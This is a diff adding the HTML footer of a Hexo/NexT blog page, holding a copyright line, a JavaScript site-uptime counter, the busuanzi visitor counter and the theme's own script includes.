+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yq1ng</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">191k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">5:18</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<br />
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("09/27/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
